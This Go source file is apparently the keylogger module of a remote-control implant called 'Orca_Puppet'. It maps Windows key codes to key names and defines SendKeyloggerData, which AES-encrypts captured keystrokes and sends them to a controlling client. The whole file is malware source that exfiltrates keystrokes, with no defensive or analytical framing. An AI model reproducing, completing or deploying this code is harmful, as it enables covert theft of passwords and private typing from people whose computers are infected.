package keyloggeropt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
)

var RawCodeMap = map[uint16]string{
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	32:  "Space",
	27:  "Escape",
	13:  "Enter",
	9:   "Tab",
	8:   "Backspace",
	45:  "Insert",
	46:  "Delete",
	39:  "Right",
	37:  "Left",
	40:  "Down",
	38:  "Up",
	33:  "Pageup",
	34:  "Pagedown",
	36:  "Home",
	35:  "End",
	20:  "Capslock",
	144: "Num_lock",
	145: "Screen_lock",
	44:  "Print_screen",
	19:  "Pause",
	112: "F1",
	113: "F2",
	114: "F3",
	115: "F4",
	116: "F5",
	117: "F6",
	118: "F7",
	119: "F8",
	120: "F9",
	121: "F10",
	122: "F11",
	123: "F12",
	124: "F13",
	125: "F14",
	126: "F15",
	127: "F16",
	128: "F17",
	129: "F18",
	130: "F19",
	131: "F20",
	132: "F21",
	133: "F22",
	134: "F23",
	135: "F24",
	160: "LShift",
	162: "LCtrl",
	164: "LAlt",
	91:  "Win",
	161: "RShift",
	163: "RCtrl",
	165: "RAlt",
	92:  "Win",
	93:  "Menu",
	96:  "Num0",
	97:  "Num1",
	98:  "Num2",
	99:  "Num3",
	100: "Num4",
	101: "Num5",
	102: "Num6",
	103: "Num7",
	104: "Num8",
	105: "Num9",
	111: "Num/",
	106: "Num*",
	109: "Num-",
	107: "Num+",
	110: "Num.",
	189: "-",
	187: "=",
	191: "/",
	190: ".",
	188: ",",
	222: "'",
	186: ";",
	220: "\\",
	219: "[",
	221: "]",
	192: "`",
}

func SendKeyloggerData(clientId, keyloggerData string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "keyloggerData"
	data, _ := crypto.Encrypt([]byte(keyloggerData), []byte(config.AesKey))
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data)
	return retData
}